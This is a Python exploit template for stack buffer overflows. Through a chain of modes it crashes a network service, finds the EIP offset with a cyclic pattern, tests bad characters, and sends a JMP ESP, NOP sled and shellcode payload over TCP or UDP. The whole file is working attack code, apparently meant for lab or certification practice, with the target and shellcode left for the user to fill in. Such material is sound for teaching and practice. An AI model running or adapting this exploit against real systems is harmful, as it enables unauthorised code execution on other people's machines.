#!/usr/bin/env python3
"""Stack buffer overflow -- JMP ESP (no DEP, no ASLR).

Workflow:
  1. Set MODE = "crash"   -> confirm crash at the right buffer size
  2. Set MODE = "pattern" -> send cyclic pattern, note EIP in debugger
  3. Set MODE = "offset"  -> paste EIP value, get offset
  4. Set MODE = "eip"     -> overwrite with 0x42424242, confirm in debugger
  5. Set MODE = "badchars"-> send badchar test after EIP, identify bad bytes
  6. Set MODE = "exploit" -> JMP ESP + shellcode

Run on Kali:
  python3 stack_bof.py
"""
import socket
import struct
import sys

# ============================================================
# FILL THESE IN
# ============================================================
MODE = "crash"          # crash | pattern | offset | eip | badchars | exploit

TARGET_HOST = "192.168.x.x"
TARGET_PORT = 9999
PROTOCOL    = "tcp"     # tcp | udp | file
OUTPUT_FILE = "payload.bin"

# Protocol framing -- what goes before/after the overflow buffer
PREFIX = b""            # e.g. b"TRUN /.:/" or b"USER " or b"http://"
SUFFIX = b""            # e.g. b"\r\n"

CRASH_LENGTH  = 5000    # total buffer length for crash test
PATTERN_LENGTH = 5000   # cyclic pattern length

# After running "offset" mode, fill these in:
OFFSET = 0              # byte offset to saved EIP
EIP_VALUE = 0x42424242  # for "eip" mode confirmation

# After finding JMP ESP and bad chars:
JMP_ESP = 0x00000000    # address of JMP ESP gadget
BADCHARS = [0x00]       # confirmed bad characters

# Shellcode -- three options (tried in order):
#   1. SHELLCODE_ASM: Keystone assembly (requires keystone-engine)
#   2. SHELLCODE_FILE: path to shellcode.bin
#   3. SHELLCODE: raw bytes pasted inline
SHELLCODE_ASM = r"""
"""
SHELLCODE_FILE = ""
SHELLCODE = b""
NOP_SLED = 16


# ============================================================
# TRANSPORT
# ============================================================
def send_payload(data):
    payload = PREFIX + data + SUFFIX
    print(f"[*] Payload: {len(payload)} bytes (data: {len(data)})")

    if PROTOCOL == "file":
        with open(OUTPUT_FILE, "wb") as f:
            f.write(payload)
        print(f"[+] Written to {OUTPUT_FILE}")
        return b""

    if PROTOCOL == "tcp":
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5.0)
            s.connect((TARGET_HOST, TARGET_PORT))
            # Uncomment if target sends a banner first:
            # banner = s.recv(1024)
            # print(f"[*] Banner: {banner}")
            s.sendall(payload)
            try:
                return s.recv(1024)
            except socket.timeout:
                return b""

    if PROTOCOL == "udp":
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(payload, (TARGET_HOST, TARGET_PORT))
        return b""

    raise ValueError(f"Unknown protocol: {PROTOCOL}")


# ============================================================
# CYCLIC PATTERN (built-in, no external deps)
# ============================================================
def cyclic_pattern(length):
    out = bytearray()
    for a in range(26):
        for b in range(26):
            for c in range(10):
                out.append(0x41 + a)
                out.append(0x61 + b)
                out.append(0x30 + c)
                if len(out) >= length:
                    return bytes(out[:length])
    return bytes(out[:length])


def cyclic_find(value):
    pat = cyclic_pattern(max(PATTERN_LENGTH, 20000))
    needle = struct.pack("<I", value)
    off = pat.find(needle)
    if off < 0:
        print(f"[-] Value 0x{value:08x} not found in pattern")
    else:
        print(f"[+] Offset: {off}")
    return off


# ============================================================
# BAD CHARACTER TEST
# ============================================================
def badchar_sequence():
    return bytes(i for i in range(256) if i not in BADCHARS)


# ============================================================
# SHELLCODE ASSEMBLY (Keystone)
# ============================================================
def assemble_ks(asm_text):
    """Assemble x86 with Keystone. Returns bytes or exits on error."""
    try:
        from keystone import Ks, KS_ARCH_X86, KS_MODE_32
    except ImportError:
        print("[-] keystone-engine not installed (pip install keystone-engine)")
        sys.exit(1)
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    cleaned = asm_text.replace("jmp short ", "jmp ")
    try:
        encoding, count = ks.asm(cleaned)
    except Exception as e:
        print(f"[-] Assembly failed: {e}")
        sys.exit(1)
    sc = bytes(encoding)
    print(f"[+] Assembled {count} instructions -> {len(sc)} bytes")
    return sc


def get_shellcode():
    """Resolve shellcode from ASM, file, or inline bytes (in priority order)."""
    asm = SHELLCODE_ASM.strip()
    if asm:
        return assemble_ks(asm)
    if SHELLCODE_FILE:
        with open(SHELLCODE_FILE, "rb") as f:
            sc = f.read()
        print(f"[+] Loaded {len(sc)} bytes from {SHELLCODE_FILE}")
        return sc
    if SHELLCODE:
        return SHELLCODE
    print("[-] No shellcode. Set SHELLCODE_ASM, SHELLCODE_FILE, or SHELLCODE.")
    sys.exit(1)


# ============================================================
# MODES
# ============================================================
def do_crash():
    print(f"[*] Sending {CRASH_LENGTH} bytes...")
    send_payload(b"A" * CRASH_LENGTH)

def do_pattern():
    print(f"[*] Sending cyclic pattern ({PATTERN_LENGTH} bytes)...")
    send_payload(cyclic_pattern(PATTERN_LENGTH))

def do_offset():
    print("[*] Paste the EIP value from the debugger (hex):")
    raw = input("    EIP = ").strip()
    value = int(raw, 16) if raw.startswith("0x") or raw.startswith("0X") else int(raw, 16)
    cyclic_find(value)

def do_eip():
    print(f"[*] Sending offset={OFFSET} + EIP=0x{EIP_VALUE:08x}")
    buf = b"A" * OFFSET
    buf += struct.pack("<I", EIP_VALUE)
    buf += b"C" * 500
    send_payload(buf)

def do_badchars():
    bc = badchar_sequence()
    print(f"[*] Sending badchar test ({len(bc)} test bytes)")
    buf = b"A" * OFFSET
    buf += struct.pack("<I", EIP_VALUE)
    buf += bc
    send_payload(buf)

def do_exploit():
    sc = get_shellcode()
    print(f"[*] Shellcode: {len(sc)} bytes")
    buf = b"A" * OFFSET
    buf += struct.pack("<I", JMP_ESP)
    buf += b"\x90" * NOP_SLED
    buf += sc
    send_payload(buf)


# ============================================================
# MAIN
# ============================================================
MODES = {
    "crash": do_crash,
    "pattern": do_pattern,
    "offset": do_offset,
    "eip": do_eip,
    "badchars": do_badchars,
    "exploit": do_exploit,
}

if __name__ == "__main__":
    mode = MODE.lower()
    if mode not in MODES:
        print(f"[-] Unknown mode: {mode}")
        print(f"    Available: {', '.join(MODES)}")
        sys.exit(1)
    MODES[mode]()
